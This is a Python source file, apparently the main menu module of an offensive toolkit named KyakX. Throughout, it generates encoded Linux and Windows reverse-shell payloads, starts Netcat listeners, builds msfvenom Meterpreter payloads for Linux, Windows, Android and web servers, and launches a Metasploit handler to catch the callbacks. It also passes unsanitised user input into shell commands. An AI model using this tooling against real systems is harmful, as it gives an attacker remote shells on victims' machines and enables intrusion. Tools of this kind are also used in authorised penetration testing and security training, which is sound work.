from kyakx.core.shell_generator import generate_linux_reverse_shell, generate_windows_reverse_shell
from kyakx.core.encoding import encode_payload
from kyakx.core.listener import start_listener
from kyakx.core.dependency_checker import check_dependency, install_dependency
from kyakx.core.command_history import setup_command_history, show_history
from colorama import Fore, Style, init
import signal
import sys

# Import these functions at use time to avoid circular imports
# from kyakx.core.web_tools import web_menu
# from kyakx.core.exploits import exploits_menu
# from kyakx.core.ssh_menu import ssh_menu

# Initialize colorama
init(autoreset=True)

# Set up signal handler for clean exit
def signal_handler(sig, frame):
    print(Fore.YELLOW + "\n[!] Exiting KyakX..." + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Set up command history when module is imported
setup_command_history()

def main_menu():
    print(Fore.YELLOW + "\n1. Reverse Shell")
    print(Fore.YELLOW + "2. Web Exploitation & Recon")
    print(Fore.YELLOW + "3. Exploits")
    print(Fore.YELLOW + "4. SSH")
    print(Fore.YELLOW + "5. MSFVenom Payloads")
    print(Fore.YELLOW + "6. Command History")
    print(Fore.YELLOW + "7. Exit\n")

    choice = input(Fore.CYAN + "Select an option: " + Style.RESET_ALL)

    if choice == "1":
        reverse_shell_menu()
    elif choice == "2":
        from kyakx.core.web_tools import web_menu
        web_menu()
    elif choice == "3":
        from kyakx.core.exploits import exploits_menu
        exploits_menu()
    elif choice == "4":
        from kyakx.core.ssh_menu import ssh_menu
        ssh_menu()
    elif choice == "5":
        msfvenom_menu()
    elif choice == "6":
        show_history()
        input(Fore.CYAN + "\nPress Enter to return to main menu..." + Style.RESET_ALL)
        main_menu()
    elif choice == "7":
        print(Fore.YELLOW + "[!] Exiting KyakX..." + Style.RESET_ALL)
        exit(0)
    else:
        print(Fore.RED + "Invalid choice!" + Style.RESET_ALL)
        main_menu()

def reverse_shell_menu():
    print("\n1. Linux Reverse Shell")
    print("2. Windows Reverse Shell")
    print("3. Go Back\n")

    shell_choice = input(Fore.CYAN + "Select: " + Style.RESET_ALL)

    if shell_choice == "1":
        linux_shell_menu()
    elif shell_choice == "2":
        windows_shell_menu()
    elif shell_choice == "3":
        main_menu()
    else:
        print(Fore.RED + "Invalid input!" + Style.RESET_ALL)
        reverse_shell_menu()

def linux_shell_menu():
    shell_types = ["Bash", "Python", "Perl", "Ruby", "Netcat", "Socat"]

    print("\nChoose Linux Shell Type:")
    for i, shell in enumerate(shell_types, start=1):
        print(f"{i}. {shell}")

    choice = input(Fore.CYAN + "Select an option: " + Style.RESET_ALL)

    try:
        choice = int(choice)
        if 1 <= choice <= len(shell_types):
            shell_type = shell_types[choice - 1].lower()
            ip = input("Enter IP: ")
            port = input("Enter Port: ")

            payload = generate_linux_reverse_shell(shell_type, ip, port)
            encoded_payload = choose_encoding(payload)

            print("\nGenerated Payload:\n")
            print(encoded_payload)

            start_nc_listener(port)

            main_menu()
        else:
            print(Fore.RED + "Invalid option!" + Style.RESET_ALL)
            linux_shell_menu()
    except ValueError:
        print(Fore.RED + "Enter a valid number!" + Style.RESET_ALL)
        linux_shell_menu()

def windows_shell_menu():
    ip = input("Enter IP: ")
    port = input("Enter Port: ")

    payload = generate_windows_reverse_shell(ip, port)
    encoded_payload = choose_encoding(payload)

    print("\nGenerated Windows Payload:\n")
    print(encoded_payload)

    start_nc_listener(port)

    main_menu()

def choose_encoding(payload):
    """Ask user if they want to encode the payload."""
    print("\nChoose encoding type:")
    print("1. Base64 Encode")
    print("2. URL Encode")
    print("3. Double URL Encode")
    print("4. No Encoding\n")

    encoding_choice = input(Fore.CYAN + "Select encoding type: " + Style.RESET_ALL)

    encoding_map = {
        "1": "base64",
        "2": "url",
        "3": "double_url",
        "4": None
    }

    encoding_type = encoding_map.get(encoding_choice)
    return encode_payload(payload, encoding_type) if encoding_type else payload

def start_nc_listener(port):
    """Check for Netcat, install if missing, then start listener."""
    
    if not check_dependency("nc"):
        print(Fore.RED + "[!] Netcat (nc) not found!" + Style.RESET_ALL)
        install_dependency("nc")
    
    if check_dependency("nc"):
        start_listener_choice = input(Fore.YELLOW + f"\nStart Netcat listener on port {port}? (y/n): " + Style.RESET_ALL)
        if start_listener_choice.lower() == "y":
            start_listener(port)
    else:
        print(Fore.RED + "[!] Netcat installation failed. Cannot start listener." + Style.RESET_ALL)

def msfvenom_menu():
    if not check_dependency("msfvenom"):
        print(Fore.RED + "[!] MSFVenom not found!" + Style.RESET_ALL)
        install_choice = input(Fore.YELLOW + "Do you want to install Metasploit Framework? (y/n): " + Style.RESET_ALL)
        if install_choice.lower() == "y":
            print(Fore.YELLOW + "[*] Installing Metasploit Framework... This might take a while." + Style.RESET_ALL)
            install_dependency("metasploit-framework")
        else:
            print(Fore.RED + "[!] MSFVenom is required for this feature." + Style.RESET_ALL)
            main_menu()
            return
    
    print("\nMSFVenom Payload Generator\n")
    print("1. Linux Payloads")
    print("2. Windows Payloads")
    print("3. Android Payloads")
    print("4. Web Payloads")
    print("5. Go Back\n")

    choice = input(Fore.CYAN + "Select payload type: " + Style.RESET_ALL)

    if choice == "1":
        generate_linux_msfvenom()
    elif choice == "2":
        generate_windows_msfvenom()
    elif choice == "3":
        generate_android_msfvenom()
    elif choice == "4":
        generate_web_msfvenom()
    elif choice == "5":
        main_menu()
    else:
        print(Fore.RED + "Invalid choice!" + Style.RESET_ALL)
        msfvenom_menu()

def generate_linux_msfvenom():
    payloads = {
        "1": "linux/x86/meterpreter/reverse_tcp",
        "2": "linux/x64/meterpreter/reverse_tcp",
        "3": "linux/x86/shell/reverse_tcp",
        "4": "linux/x64/shell/reverse_tcp"
    }
    
    formats = {
        "1": "elf",
        "2": "raw",
        "3": "c"
    }
    
    print("\nLinux Payloads:")
    for key, value in payloads.items():
        print(f"{key}. {value}")
    
    payload_choice = input(Fore.CYAN + "\nSelect payload: " + Style.RESET_ALL)
    if payload_choice not in payloads:
        print(Fore.RED + "Invalid payload choice!" + Style.RESET_ALL)
        generate_linux_msfvenom()
        return
    
    print("\nOutput Formats:")
    for key, value in formats.items():
        print(f"{key}. {value}")
    
    format_choice = input(Fore.CYAN + "\nSelect format: " + Style.RESET_ALL)
    if format_choice not in formats:
        print(Fore.RED + "Invalid format choice!" + Style.RESET_ALL)
        generate_linux_msfvenom()
        return
    
    ip = input(Fore.CYAN + "Enter LHOST (Your IP): " + Style.RESET_ALL)
    port = input(Fore.CYAN + "Enter LPORT: " + Style.RESET_ALL)
    output_path = input(Fore.CYAN + "Enter output file path: " + Style.RESET_ALL)
    
    selected_payload = payloads[payload_choice]
    selected_format = formats[format_choice]
    
    command = f"msfvenom -p {selected_payload} LHOST={ip} LPORT={port} -f {selected_format} -o {output_path}"
    
    print(Fore.YELLOW + f"\n[+] Generating payload with command: {command}" + Style.RESET_ALL)
    import os
    result = os.system(command)
    
    if result == 0:
        print(Fore.GREEN + f"\n[+] Payload generated successfully at {output_path}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "\n[!] Failed to generate payload." + Style.RESET_ALL)
    
    handler_choice = input(Fore.YELLOW + "\nStart Metasploit handler? (y/n): " + Style.RESET_ALL)
    if handler_choice.lower() == "y":
        start_metasploit_handler(selected_payload, ip, port)
    
    input(Fore.CYAN + "\nPress Enter to return to MSFVenom menu..." + Style.RESET_ALL)
    msfvenom_menu()

def generate_windows_msfvenom():
    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/reverse_https",
        "3": "windows/shell/reverse_tcp",
        "4": "windows/powershell_reverse_tcp"
    }
    
    formats = {
        "1": "exe",
        "2": "dll",
        "3": "vbs",
        "4": "powershell"
    }
    
    print("\nWindows Payloads:")
    for key, value in payloads.items():
        print(f"{key}. {value}")
    
    payload_choice = input(Fore.CYAN + "\nSelect payload: " + Style.RESET_ALL)
    if payload_choice not in payloads:
        print(Fore.RED + "Invalid payload choice!" + Style.RESET_ALL)
        generate_windows_msfvenom()
        return
    
    print("\nOutput Formats:")
    for key, value in formats.items():
        print(f"{key}. {value}")
    
    format_choice = input(Fore.CYAN + "\nSelect format: " + Style.RESET_ALL)
    if format_choice not in formats:
        print(Fore.RED + "Invalid format choice!" + Style.RESET_ALL)
        generate_windows_msfvenom()
        return
    
    ip = input(Fore.CYAN + "Enter LHOST (Your IP): " + Style.RESET_ALL)
    port = input(Fore.CYAN + "Enter LPORT: " + Style.RESET_ALL)
    output_path = input(Fore.CYAN + "Enter output file path: " + Style.RESET_ALL)
    
    selected_payload = payloads[payload_choice]
    selected_format = formats[format_choice]
    
    command = f"msfvenom -p {selected_payload} LHOST={ip} LPORT={port} -f {selected_format} -o {output_path}"
    
    print(Fore.YELLOW + f"\n[+] Generating payload with command: {command}" + Style.RESET_ALL)
    import os
    result = os.system(command)
    
    if result == 0:
        print(Fore.GREEN + f"\n[+] Payload generated successfully at {output_path}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "\n[!] Failed to generate payload." + Style.RESET_ALL)
    
    handler_choice = input(Fore.YELLOW + "\nStart Metasploit handler? (y/n): " + Style.RESET_ALL)
    if handler_choice.lower() == "y":
        start_metasploit_handler(selected_payload, ip, port)
    
    input(Fore.CYAN + "\nPress Enter to return to MSFVenom menu..." + Style.RESET_ALL)
    msfvenom_menu()

def generate_android_msfvenom():
    payloads = {
        "1": "android/meterpreter/reverse_tcp",
        "2": "android/meterpreter/reverse_https",
        "3": "android/shell/reverse_tcp"
    }
    
    print("\nAndroid Payloads:")
    for key, value in payloads.items():
        print(f"{key}. {value}")
    
    payload_choice = input(Fore.CYAN + "\nSelect payload: " + Style.RESET_ALL)
    if payload_choice not in payloads:
        print(Fore.RED + "Invalid payload choice!" + Style.RESET_ALL)
        generate_android_msfvenom()
        return
    
    ip = input(Fore.CYAN + "Enter LHOST (Your IP): " + Style.RESET_ALL)
    port = input(Fore.CYAN + "Enter LPORT: " + Style.RESET_ALL)
    output_path = input(Fore.CYAN + "Enter output file path (with .apk extension): " + Style.RESET_ALL)
    
    if not output_path.endswith(".apk"):
        output_path += ".apk"
    
    selected_payload = payloads[payload_choice]
    
    command = f"msfvenom -p {selected_payload} LHOST={ip} LPORT={port} -o {output_path}"
    
    print(Fore.YELLOW + f"\n[+] Generating payload with command: {command}" + Style.RESET_ALL)
    import os
    result = os.system(command)
    
    if result == 0:
        print(Fore.GREEN + f"\n[+] Payload generated successfully at {output_path}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "\n[!] Failed to generate payload." + Style.RESET_ALL)
    
    handler_choice = input(Fore.YELLOW + "\nStart Metasploit handler? (y/n): " + Style.RESET_ALL)
    if handler_choice.lower() == "y":
        start_metasploit_handler(selected_payload, ip, port)
    
    input(Fore.CYAN + "\nPress Enter to return to MSFVenom menu..." + Style.RESET_ALL)
    msfvenom_menu()

def generate_web_msfvenom():
    payloads = {
        "1": "php/meterpreter/reverse_tcp",
        "2": "java/jsp_shell_reverse_tcp",
        "3": "nodejs/shell_reverse_tcp"
    }
    
    print("\nWeb Payloads:")
    for key, value in payloads.items():
        print(f"{key}. {value}")
    
    payload_choice = input(Fore.CYAN + "\nSelect payload: " + Style.RESET_ALL)
    if payload_choice not in payloads:
        print(Fore.RED + "Invalid payload choice!" + Style.RESET_ALL)
        generate_web_msfvenom()
        return
    
    ip = input(Fore.CYAN + "Enter LHOST (Your IP): " + Style.RESET_ALL)
    port = input(Fore.CYAN + "Enter LPORT: " + Style.RESET_ALL)
    output_path = input(Fore.CYAN + "Enter output file path: " + Style.RESET_ALL)
    
    selected_payload = payloads[payload_choice]
    
    # Determine output format based on payload
    format_option = ""
    if "php" in selected_payload:
        format_option = "-f raw"
    elif "jsp" in selected_payload:
        format_option = "-f raw"
    elif "nodejs" in selected_payload:
        format_option = "-f raw"
    
    command = f"msfvenom -p {selected_payload} LHOST={ip} LPORT={port} {format_option} -o {output_path}"
    
    print(Fore.YELLOW + f"\n[+] Generating payload with command: {command}" + Style.RESET_ALL)
    import os
    result = os.system(command)
    
    if result == 0:
        print(Fore.GREEN + f"\n[+] Payload generated successfully at {output_path}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "\n[!] Failed to generate payload." + Style.RESET_ALL)
    
    handler_choice = input(Fore.YELLOW + "\nStart Metasploit handler? (y/n): " + Style.RESET_ALL)
    if handler_choice.lower() == "y":
        start_metasploit_handler(selected_payload, ip, port)
    
    input(Fore.CYAN + "\nPress Enter to return to MSFVenom menu..." + Style.RESET_ALL)
    msfvenom_menu()

def start_metasploit_handler(payload, ip, port):
    import os
    import tempfile
    
    resource_content = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {ip}
set LPORT {port}
set ExitOnSession false
exploit -j -z
    """
    
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.rc') as temp:
        temp.write(resource_content)
        resource_file = temp.name
    
    print(Fore.YELLOW + "\n[+] Starting Metasploit Handler..." + Style.RESET_ALL)
    os.system(f"msfconsole -r {resource_file}")
    
    # Delete temporary file
    try:
        os.remove(resource_file)
    except:
        pass